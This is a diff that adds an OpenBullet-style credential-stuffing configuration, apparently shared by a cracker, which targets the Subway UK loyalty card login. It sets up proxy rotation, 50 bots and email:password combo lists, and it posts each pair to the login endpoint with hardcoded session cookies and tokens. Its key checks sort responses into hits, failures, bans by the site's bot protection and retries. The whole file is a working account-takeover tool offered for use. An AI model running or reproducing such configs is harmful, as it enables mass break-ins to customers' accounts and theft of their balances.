@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "Subway_UK",
+  "SuggestedBots": 50,
+  "LastModified": "2019-06-27T04:17:52.8321859-07:00",
+  "AdditionalInfo": "no cap yet dm me if you find one on discord Swisha_House#1946",
+  "Author": "Swisha",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://subcarduk.altaineapps.com/Auth/TTL/Login" 
+  CONTENT "__RequestVerificationToken=D-yvv7sMDS8CAgejAaC4plmdAOZ14E8EIQDPCgMtyG1WVngq__lUNW314CXVpshJs8sSAovjYAYajEN36vDjxiVYv4vOdsv-5Ge3hUhi8Uc1&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: incap_ses_459_1996516=wp2XWqfLoxHJHr8Ff7NeBlM2AV0AAAAAhM56rQfwg5wBTBA7gOwbCw==; nlbi_1996516=7vnlZaC+e1nTMK9BfoqEowAAAAA6cEhOYertYKE0l46LvmD+; ARRAffinity=c86baeb0e4d5da57ec5438733f72302a891e0b2d88707fc008905c24fc24af48; __RequestVerificationToken_L0F1dGg1=U-2xG_d7L2h6TPMnrwdhwOdye0PmD9KiMSFkUreHduMUsJ2zvv4BkKQR-TzbtWsTqR1mw9Vtyi_tI4dh3hhjkw3sTUuZafGVK4I1qyMesuU1; TTLSessionToken=Y4Ph1Ug1gMcnBAAHSTnFlw==|0ada0913-e84d-c86c-e946-c5e0575c655e|637274933110577630|s9hH7cF4O3l/GLF//ItTuUWNK4rCfYpnoEL8PrXaErdOU9WLbcIqKaqfLZi51LnSJYSYvV5/D7WClX3fEqwh6w==; visid_incap_1996516=lcDSnl8CRpGVOSyaoMpH6Vg1AV0AAAAAQUIPAAAAAADZJcKlNM3qcyFbw+CRKgwe" 
+  HEADER "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "referer: https://subcarduk.altaineapps.com/Auth/TTL/Login" 
+  HEADER "accept-encoding: br, gzip, deflate" 
+  HEADER "Pragma: no-cache" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "origin: https://subcarduk.altaineapps.com" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, unable to retrieve customer information. Please try again" 
+    KEY "Server Error in " 
+    KEY "A potentially dangerous Request.Form " 
+  KEYCHAIN Success OR 
+    KEY "Successfully authenticated" 
+  KEYCHAIN Ban OR 
+    KEY "/_Incapsula_Resource?CWUDNSAI=20&xinfo" 
+  KEYCHAIN Retry OR 
+    KEY "Wrong username or password" 
+
